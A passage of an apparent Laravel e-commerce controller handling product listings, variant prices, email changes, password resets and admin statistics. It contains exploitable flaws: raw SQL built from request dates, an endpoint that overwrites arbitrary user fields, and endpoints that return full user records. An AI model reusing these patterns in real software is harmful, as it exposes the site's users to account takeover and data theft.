            $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }

        if ($seller_id != null) {
            $conditions = array_merge($conditions, ['user_id' => Seller::findOrFail($seller_id)->user->id]);
        }

        $products = DB::table('products')->where("refurbished", 1)->where($conditions);

        if ($category_id != null) {
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $products = $products->whereIn('category_id', $category_ids);
        }

        if ($min_price != null && $max_price != null) {

            $products = $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
        }

        if ($query != null) {
            $searchController = new SearchController;
            $searchController->store($request);
            $products = $products->where('name', 'like', '%' . $query . '%');
        }

        if ($sort_by != null) {
            switch ($sort_by) {
                case 'newest':
                    $products->orderBy('created_at', 'desc');
                    break;
                case 'oldest':
                    $products->orderBy('created_at', 'asc');
                    break;
                case 'price-asc':
                    $products->orderBy('unit_price', 'asc');
                    break;
                case 'price-desc':
                    $products->orderBy('unit_price', 'desc');
                    break;
                default:
                    // code...
                    break;
            }
        }


        $non_paginate_products = filter_products($products)->limit(19)->get();

        //Attribute Filter

        $attributes = array();
        foreach ($non_paginate_products as $key => $product) {
            if ($product->attributes != null && is_array(json_decode($product->attributes))) {

                foreach (json_decode($product->attributes) as $key => $value) {

                    $flag = false;
                    $pos = 0;
                    foreach ($attributes as $key => $attribute) {
                        if ($attribute['id'] == $value) {
                            $flag = true;
                            $pos = $key;
                            break;
                        }
                    }
                    if (!$flag) {
                        $item['id'] = $value;
                        $item['values'] = array();
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                $item['values'] = $choice_option->values;
                                break;
                            }
                        }
                        array_push($attributes, $item);
                    } else {
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                foreach ($choice_option->values as $key => $value) {
                                    if (!in_array($value, $attributes[$pos]['values'])) {
                                        array_push($attributes[$pos]['values'], $value);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        $selected_attributes = array();

        foreach ($attributes as $key => $attribute) {
            if ($request->has('attribute_' . $attribute['id'])) {
                foreach ($request['attribute_' . $attribute['id']] as $key => $value) {
                    $str = '"' . $value . '"';
                    $products = $products->where('choice_options', 'like', '%' . $str . '%');
                }

                $item['id'] = $attribute['id'];
                $item['values'] = $request['attribute_' . $attribute['id']];
                array_push($selected_attributes, $item);
            }
        }


        //Color Filter
        $all_colors = array();

        foreach ($non_paginate_products as $key => $product) {

            if ($product->colors != null) {
                foreach (json_decode($product->colors) as $key => $color) {
                    if (!in_array($color, $all_colors)) {
                        array_push($all_colors, $color);
                    }
                }
            }
        }


        // $selected_color = null;

        if ($request->has('color')) {
            $str = '"' . $request->color . '"';
            $products = $products->where('colors', 'like', '%' . $str . '%');
            $selected_color = $request->color;
        }

        // 'attributes', 'selected_attributes', 'all_colors', 'selected_color'
        $products = $products->paginate(12)->appends(request()->query());
        // ini_set('memory_limit', '-1');

        return view('frontend.product_listing_exclusive', compact(
            'products',
            'all_colors',
            'attributes',
            'query',
            'category_id',
            'brand_id',
            'sort_by',
            'seller_id',
            'min_price',
            'max_price'
        ));
    }
    public function home_settings(Request $request)
    {
        return view('home_settings.index');
    }

    public function top_10_settings(Request $request)
    {
        foreach (Category::all() as $key => $category) {
            if (is_array($request->top_categories) && in_array($category->id, $request->top_categories)) {
                $category->top = 1;
                $category->save();
            } else {
                $category->top = 0;
                $category->save();
            }
        }

        foreach (Brand::all() as $key => $brand) {
            if (is_array($request->top_brands) && in_array($brand->id, $request->top_brands)) {
                $brand->top = 1;
                $brand->save();
            } else {
                $brand->top = 0;
                $brand->save();
            }
        }

        flash(translate('Top 10 categories and brands have been updated successfully'))->success();
        return redirect()->route('home_settings.index');
    }

    public function variant_price(Request $request)
    {
        $product = Product::find($request->id);
        $str = '';
        $quantity = 0;

        if ($request->has('color')) {
            $str = $request['color'];
        }

        if (json_decode(Product::find($request->id)->choice_options) != null) {
            foreach (json_decode(Product::find($request->id)->choice_options) as $key => $choice) {
                if ($str != null) {
                    $str .= '-' . str_replace(' ', '', $request['attribute_id_' . $choice->attribute_id]);
                } else {
                    $str .= str_replace(' ', '', $request['attribute_id_' . $choice->attribute_id]);
                }
            }
        }

        if ($str != null && $product->variant_product) {
            $product_stock = $product->stocks->where('variant', $str)->first();
            //    $price = $product_stock->price;
            $price = product_discount($product, $product_stock->price)["price"];

            $quantity = $product_stock->qty;
        } else {
            // $price = $product->unit_price;
            $price = product_discount($product)["price"];

            $quantity = $product->current_stock;
        }

        //Product Stock Visibility
        if ($product->stock_visibility_state == 'text') {
            $stock_text = 'Stock';
        } else {
            $stock_text = $quantity;
        }



        if (!empty($product->taxe)) {
            if ($product->taxe->tax_type == 'percent') {
                $price += ($price * $product->taxe->tax) / 100;
            } elseif ($product->taxe->tax_type == 'amount') {
                $price += $product->taxe->tax;
            }
        }
        return array(
            'price' => single_price($price * $request->quantity),
            'quantity' => $quantity,
            'digital' => $product->digital,
            'variation' => $str,
            'stock_text' => $stock_text
        );
    }

    public function sellerpolicy()
    {
        return view("frontend.policies.sellerpolicy");
    }

    public function returnpolicy()
    {
        return view("frontend.policies.returnpolicy");
    }

    public function supportpolicy()
    {
        return view("frontend.policies.supportpolicy");
    }

    public function terms()
    {
        return view("frontend.policies.terms");
    }

    public function privacypolicy()
    {
        return view("frontend.policies.privacypolicy");
    }

    public function get_pick_ip_points(Request $request)
    {
        $pick_up_points = PickupPoint::all();
        return view('frontend.partials.pick_up_points', compact('pick_up_points'));
    }

    public function get_category_items(Request $request)
    {
        $category = Category::findOrFail($request->id);
        return view('frontend.partials.category_elements', compact('category'));
    }

    public function premium_package_index()
    {
        $customer_packages = CustomerPackage::all();
        return view('frontend.user.customer_packages_lists', compact('customer_packages'));
    }

    public function seller_digital_product_list(Request $request)
    {
        $products = Product::where('user_id', Auth::user()->id)->where('digital', 1)->orderBy('created_at', 'desc')->paginate(10);
        return view('frontend.user.seller.digitalproducts.products', compact('products'));
    }
    public function show_digital_product_upload_form(Request $request)
    {
        if (\App\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Addon::where('unique_identifier', 'seller_subscription')->first()->activated) {
            if (Auth::user()->seller->remaining_digital_uploads > 0) {
                $business_settings = BusinessSetting::where('type', 'digital_product_upload')->first();
                $categories = Category::where('digital', 1)->get();
                return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
            } else {
                flash(translate('Upload limit has been reached. Please upgrade your package.'))->warning();
                return back();
            }
        }

        $business_settings = BusinessSetting::where('type', 'digital_product_upload')->first();
        $categories = Category::where('digital', 1)->get();
        return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
    }

    public function show_digital_product_edit_form(Request $request, $id)
    {
        $categories = Category::where('digital', 1)->get();
        $lang = $request->lang;
        $product = Product::find($id);
        return view('frontend.user.seller.digitalproducts.product_edit', compact('categories', 'product', 'lang'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if (isUnique($email) == '0') {
            $response['status'] = 2;
            $response['message'] = 'Email already exists!';
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }


    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if (isUnique($email)) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('A verification mail has been sent to the mail you provided us with.'))->success();
            return back();
        }

        flash(translate('Email already exists!'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        $array['from'] = env('MAIL_USERNAME');
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback') . '?new_email_verificiation_code=' . $verification_code . '&email=' . $email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = "Email Second";

        $user = Auth::user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");
        } catch (\Exception $e) {
            // return $e->getMessage();
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {
        if ($request->has('new_email_verificiation_code') && $request->has('email')) {
            $verification_code_of_url_param =  $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('Email Changed successfully'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('Email was not verified. Please resend your mail!'))->error();
        return redirect()->route('dashboard');
    }

    public function reset_password_with_code(Request $request)
    {
        if (($user = User::where('email', $request->email)->where('verification_code', $request->code)->first()) != null) {
            if ($request->password == $request->password_confirmation) {
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                event(new PasswordReset($user));
                auth()->login($user, true);

                flash(translate('Password updated successfully'))->success();

                if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            } else {
                flash("Password and confirm password didn't match")->warning();
                return back();
            }
        } else {
            flash("Verification code mismatch")->error();
            return back();
        }
    }


    public function all_flash_deals()
    {
        $today = strtotime(date('Y-m-d H:i:s'));

        $data['all_flash_deals'] = FlashDeal::where('status', 1)
            ->where('start_date', "<=", $today)
            ->where('end_date', ">", $today)
            ->orderBy('created_at', 'desc')
            ->get();

        return view("frontend.flash_deal.all_flash_deal_list", $data);
    }

    public function all_seller(Request $request)
    {

        $shops = DB::table('sellers')
            ->join("shops", function ($join) {
                $join->on("sellers.user_id", "=", "shops.user_id");
            })
            ->where("sellers.verification_status", 1)
            ->select("sellers.user_id", "shops.logo", "shops.name", "shops.slug")
            ->paginate(9);

        return view('frontend.shop_listing', [
            "shops" => $shops
        ]);
    }


    public function all_seller_pagination(Request $request)
    {
    }


    public function search_navbar(Request $request)
    {
        // return dd($request->type);
        if ($request->type == "products") {
            $product = new ProductController();

            return $product->all_products($request, "search");
        } else if ($request->type == "sales") {

            // $orders = new NewerOrderController();
            // return redirect()->route("NewerOrders.index")->("request", $request->search);
            return redirect()->action("NewerOrderController@index", ["search" => $request->search, "type" => $request->type, "order_search" => 1]);

            //  return $orders->index($request, 1);
        } else if ($request->type == "customers") {

            $customers = new CustomerController();
            return redirect()->action("CustomerController@customersjs", ["search" => $request->search, "type" => $request->type]);

            // return $customers->index($request, "search");
        } else if ($request->type == "sellers") {

            //$sellers = new SellerController();
            return redirect()->action("SellerController@sellersjs", ["search" => $request->search, "type" => $request->type]);

            //  return $sellers->index($request, "search");
        }
    }


    public function getUser(Request $request)
    {
        $user = User::find($request->user_id);

        return response()->json([
            "user" => $user
        ]);
    }

    public function setDataUser(Request $request)
    {
        $user = User::find($request->user_id);
        foreach ($request->user as $key => $value) {
            $user->{$key} = $value;
        }
        $user->save();

        return response()->json([
            "user" => $user
        ]);
    }



    public function setAvatarUser(Request $request)
    {
        $user = User::find($request->user_id);
        $user->avatar = save_file($request->photo, '/avatar_users');
        $user->save();

        return response()->json([
            "avatar" => $user->avatar
        ]);
    }

    public function sendMail(Request $request)
    {




        $this->overWriteEnvFile("MAIL_HOST", get_setting($request->data["mail_driver"] . "_host"));
        $this->overWriteEnvFile("MAIL_PORT", get_setting($request->data["mail_driver"] . "_port"));
        $this->overWriteEnvFile("MAIL_USERNAME", get_setting($request->data["mail_driver"] . "_username"));
        $this->overWriteEnvFile("MAIL_PASSWORD", get_setting($request->data["mail_driver"] . "_password"));
        $this->overWriteEnvFile("MAIL_ENCRYPTION", get_setting($request->data["mail_driver"] . "_encryption"));

        // \Artisan::call('config:cache');
        // \Artisan::call('config:clear');
        //  return env("MAIL_USERNAME");
        $array = [];
        $array['view'] = $request->data["view"];
        $array['subject'] = $request->data["subject"];
        $array['from'] = get_setting($request->data["mail_driver"] . "_from_address");
        $array['content'] = $request->data["content"];
        $array['sender'] = $request->data["sender"];
        $array['link'] = $request->data["link"];
        $array['text_btn'] = $request->data["text_btn"];
        $array['details'] = "";

        $user = User::find($request->user_id);

        Mail::to($user->email)->queue(new SupportMailManager($array));
        return response()->json([
            "status" => "done"
        ]);
    }


    public function orders_count(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $orders = DB::select("SELECT COUNT(*) AS orders from orders  ");

        return response()->json([
            "orders" => $orders[0]->orders
        ]);
    }
    public function total_categories(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $categories = DB::select("SELECT COUNT(*) AS categories from categories  ");

        return response()->json([
            "total_categories" => $categories[0]->categories
        ]);
    }
    public function total_brends(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $total_brends = DB::select("SELECT COUNT(*) AS brands from brands  ");

        return response()->json([
            "brands" => $total_brends[0]->brands
        ]);
    }

    public function total_products_published(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $total_products_published = DB::select("SELECT COUNT(*) AS products from products where published = 1  ");
        $total_products_unpublished = DB::select("SELECT COUNT(*) AS products from products where published = 0  ");

        return response()->json([
            "total_products_published" => [
                "type" => translate("Total published products"),
                "value" => $total_products_published[0]->products
            ],
            "total_products_unpublished" => [
                "type" => translate("Total unpublished products"),
                "value" => $total_products_unpublished[0]->products
            ],
        ]);
    }

    public function total_products_sellers(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $total_products_sellers = DB::select("SELECT COUNT(*) AS products from products where added_by = 'seller'  ");

        return response()->json([

            "total_products_sellers" => [
                "type" => translate("Total sellers products"),
                "value" => $total_products_sellers[0]->products
            ],

        ]);
    }


    public function total_products_admins(Request $request)
    {

        $total_products_admins = DB::select("SELECT COUNT(*) AS products from products where added_by = 'admin'  ");

        return response()->json([

            "total_products_admins" => [
                "type" => translate("Total admin products"),
                "value" => $total_products_admins[0]->products
            ]
        ]);
    }

    ///seller///////////////////////////////////////////////////////////////////////



    public function total_sellers(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $sellers = DB::select("SELECT COUNT(*) AS sellers from sellers  ");

        return response()->json([
            "total_sellers" => [
                "type" => translate("Total sellers"),
                "value" => $sellers[0]->sellers
            ],

        ]);
    }

    public function total_approved_sellers(Request $request)
    {
        // $products = DB::select("SELECT COUNT(*) AS products from products LIMIT  80000 ");
        $sellers = DB::select("SELECT COUNT(*) AS sellers from sellers where verification_status = 1 ");

        return response()->json([
            "total_approved_sellers" => [
                "type" => translate("Total approved sellers"),
                "value" => $sellers[0]->sellers
            ],

        ]);
    }


    public function total_pendding_sellers(Request $request)
    {

        $sellers = DB::select("SELECT COUNT(*) AS sellers from sellers where verification_status = 0 ");

        return response()->json([
            "total_pendding_sellers" => [
                "type" => translate("Total pendding sellers"),
                "value" => $sellers[0]->sellers
            ],

        ]);
    }

    public function number_of_sales(Request $request)
    {



        $sales = DB::select("SELECT SUM(products.num_of_sale) AS `number`,categories.name
                             FROM categories
                             JOIN products ON products.category_id = categories.id
                             GROUP BY categories.id
                             ORDER BY `number` ASC
                             ");


        // SELECT COUNT(*) AS `number`,categories.name
        //  FROM categories
        //  JOIN products ON products.category_id = categories.id
        //  JOIN order_details ON order_details.product_id = products.id
        //  JOIN orders ON orders.id = order_details.order_id
        //  WHERE orders.created_at >= '$request->start_date'
        //  AND orders.created_at <= '$request->end_date'
        //  GROUP BY categories.id

        return response()->json([
            "number_of_sales" => $sales
        ]);
    }


    public function number_of_stock_products(Request $request)
    {



        $stock_products = DB::select("SELECT SUM(products.current_stock) AS `number`,categories.name FROM categories
                JOIN products ON products.category_id = categories.id
                WHERE products.created_at >= '$request->start_date'
                AND products.created_at <= '$request->end_date'
                 GROUP BY categories.id
                 ORDER BY `number` ASC
                 ");

        return response()->json([
            "number_of_stock_products" => $stock_products
        ]);
    }


    public function get_top_products(Request $request)
    {
        $top_12_products = DB::select("SELECT * FROM products WHERE products.published = 1 ORDER By products.num_of_sale DESC LIMIT 12");



        // SELECT COUNT(orders.id) AS orders_count, products.* FROM products
        //                                JOIN order_details ON order_details.product_id = products.id
        //                                JOIN orders ON orders.id = order_details.order_id
        //                                WHERE products.published = 1
        //                                AND num_of_sale != 0
        //                                AND orders.created_at >= '$request->start_date'
        //                                AND orders.created_at <= '$request->end_date'
        //                                GROUP BY products.id
        //                                ORDER By orders_count
        //                                DESC LIMIT 12




        $products = collect($top_12_products)->map(function ($product) {
            $product->home_base_price =  home_base_price($product->id);
            $product->home_discounted_base_price =  home_discounted_base_price($product->id);
            // $product->renderStarRating =  renderStarRating($product->rating);
            $product->photos = !empty(Upload::find($product->photos)->file_name) ?  url("/public") . "/" . Upload::find($product->photos)->file_name : url("/public") . "/" . "assets/img/placeholder.jpg";
            $product->thumbnail_img = !empty(Upload::find($product->photos)->file_name) ?  url("/public") . "/" . Upload::find($product->thumbnail_img)->file_name : url("/public") . "/" . "assets/img/placeholder.jpg";
            $product->slug = url("/product") . "/" . $product->slug;

            return $product;
        });

        return response()->json([
            "products" => $products,
            "style_price" => get_setting("style_price"),
            "style_price_del" => get_setting("style_price_del")


        ]);
    }



    public function getUsers(Request $request)
    {
        $users = DB::table('users');

        $check_number = true;
        if ($request->name != "") {
            $users->Where('name', 'like', '%' . $request->name . '%');
            $check_number = false;
        }
        if ($request->phone != "") {
            $users->Where('phone', 'like', '%' . $request->phone . '%');
            $check_number = false;
        }
        if ($request->email != "") {
            $users->Where('email', 'like', '%' . $request->email . '%');
            $check_number = false;
        }
        if ($request->country_id != "") {
            $users->Where('country_id', $request->country_id);
            $check_number = false;
        }
        if ($request->city_id != "") {
            $users->Where('city_id', $request->city_id);
            $check_number = false;
        }

        if ($request->user_type != "") {
            $users->Where('user_type', $request->user_type);
            $check_number = false;
        }
        if ($check_number) {

            $users =    $users->skip($request->pagination)
                ->take(20);
        }

        $users = $users->get();
        return response()->json([
            "users" => $users,
            "check_number" => $check_number
        ]);
    }

    public function saidbarpanel(Request $request)
    {
        $avatar_original =  Auth::user()->avatar_original;
        $name = Auth::user()->name;
        $user_type = Auth::user()->user_type;

        $verification_status = "";
        if ($user_type == "seller") {
            $verification_status =  Auth::user()->seller->verification_status;
        }

        $vendor_system_activation = BusinessSetting::where('type', 'vendor_system_activation')->first()->value;
        $date = date("Y-m-d");
        $days_ago_30 = date('Y-m-d', strtotime('-30 days', strtotime($date)));
        $days_ago_60 = date('Y-m-d', strtotime('-60 days', strtotime($date)));
        $orderTotal1 = DB::table('orders')
            ->where('seller_id', Auth::user()->id)
            ->where("payment_status", 'paid')
            ->where('created_at', '>=', $days_ago_30)
            ->select(DB::raw("SUM(orders.grand_total) as grand_total_first"))
            ->get();

        $orderTotal2 = DB::table('orders')
            ->where('seller_id', Auth::user()->id)
            ->where("payment_status", 'paid')
            ->select(DB::raw("SUM(orders.grand_total) as grand_total"))
            ->get();

        $orderTotal3 = DB::table('orders')
            ->where('seller_id', Auth::user()->id)
            ->where("payment_status", 'paid')
            ->where('created_at', '>=', $days_ago_60)
            ->where('created_at', '<=', $days_ago_30)
            ->select(DB::raw("SUM(orders.grand_total) as grand_total_last"))
            ->get();


        //     avatar_original: "",
        // name: "",
        // user_type: "",
        // verification_status: 0,
        // vendor_system_activation: 0,
        // grand_total_first:0,
        // grand_total: 0,
        // grand_total_last:0

        return response()->json([
            "avatar_original" => $avatar_original,
            "name" => $name,
            "verification_status" => $verification_status,
            "grand_total_first" => single_price(count($orderTotal1) != 0 ? $orderTotal1[0]->grand_total_first : 0),
            "grand_total_last" => single_price(count($orderTotal3) != 0 ? $orderTotal3[0]->grand_total_last : 0),
            "vendor_system_activation" => $vendor_system_activation,
            "user_type" => $user_type

        ]);
    }

    public function store_home(Request $request)
    {

        if (!isset($request->type)) {
            $products = DB::table('products')
                ->where('user_id', $request->user_id)
                ->where('published', 1)
                ->select("products.thumbnail_img", "products.id", "products.name", "products.slug", "products.created_at", "products.rating")
                ->orderBy('products.created_at', 'desc')
                ->limit(24)
                ->get();
            //\App\Product::where('user_id', $shop->user->id)->where('published', 1)->orderBy('created_at', 'desc')->paginate(24);
        } elseif ($request->type == 'top_selling') {
            $products = DB::table('products')
                ->where('user_id', $request->user_id)
                ->where('published', 1)
                ->select("products.thumbnail_img", "products.id", "products.name", "products.slug", "products.created_at", "products.rating")
                ->orderBy('num_of_sale', 'desc')
                ->limit(24)
                ->get();
            //\App\Product::where('user_id', $shop->user->id)->where('published', 1)->orderBy('num_of_sale', 'desc')->paginate(24);
        } elseif ($request->type == 'all_products') {
            $products = DB::table('products')
                ->where('user_id', $request->user_id)
                ->where('published', 1)
                ->select("products.thumbnail_img", "products.id", "products.name", "products.slug", "products.created_at", "products.rating")
                ->limit(24)
                ->get();
            //\App\Product::where('user_id', $shop->user->id)->where('published', 1)->paginate(24);
        }
        //return dd($products);
        // foreach ($products as  $value) {
        //     return dd($value->id);
        // }
        $products = $products->map(function ($item) {
            $item->is_del = home_base_price($item->id) != home_discounted_base_price($item->id);
            $item->home_base_price = home_base_price($item->id);
            $item->price = home_discounted_base_price($item->id);
            $item->photo = uploaded_asset($item->thumbnail_img);
            return $item;
        });
        // return dd($products);
        return response()->json([
            "products" => $products
        ]);
    }


    public function category_menu(Request $request)
    {

        $category_menu =  view("frontend.partials.category_menu")->render();
        return response()->json([
            "category_menu" => $category_menu
        ]);
    }

    public function spcialOffersProducts(Request $request)
    {

        $top_12_products =   DB::table('special_offers')
            ->join('special_offers_customer_purchase', function ($join) {
                $join->on('special_offers.id', '=', 'special_offers_customer_purchase.special_offers_id');
            })
            ->join('special_offers_product', function ($join) {
                $join->on('special_offers.id', '=', 'special_offers_product.special_offers_id')
                    ->where("special_offers_product.type_x_to_y", null)
                    ->where("special_offers_product.type", "product");
            })
            ->join('products', function ($join) {
                $join->on('products.id', '=', 'special_offers_product.object_id');
            })
            ->where("special_offers_customer_purchase.offer_applies_type", 2)
            ->where("special_offers.end_date", ">", now())

            ->select("special_offers_customer_purchase.*", "special_offers.*", "special_offers_product.*", "products.*")
            ->limit(12)
            ->get();
        return view('frontend.partials.special_offers_products', [
            "top_12_products" => $top_12_products
        ]);
    }


    public function render_sub_cat($id)
    {

        return view("frontend.inc.sub_cat_side_nav", [
            "parent_id" => $id
        ])->render();
    }

    public function ourbranches()
    {
        return view("frontend.policies.ourbranches");
    }
}
